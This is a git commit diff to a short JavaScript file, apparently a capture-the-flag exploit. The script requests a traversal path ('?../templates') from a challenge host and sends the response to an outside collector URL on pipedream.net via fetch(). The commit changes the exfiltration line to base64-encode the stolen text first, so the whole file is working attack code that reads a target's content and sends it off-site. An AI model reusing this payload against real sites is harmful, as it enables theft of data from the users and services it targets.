c6f308ad755d4a93885301177620550352ac5d26
as3617 <46442697+as3617@users.noreply.github.com>
2020-03-15 00:42:13 +0900

    Update index.js

--- index.js
+++ index.js
@@ -3,6 +3,6 @@ xhr.open("GET", "http://catweb.zajebistyc.tf/?../templates");
 xhr.onreadystatechange = function() {
     text = xhr.responseText;
     console.log(xhr.getAllResponseHeaders());
-    fetch('https://encnu1395lyv7.x.pipedream.net/?q=' + text);
+    fetch('https://encnu1395lyv7.x.pipedream.net/?q=' +btoa(text));
 };
 xhr.send(null);
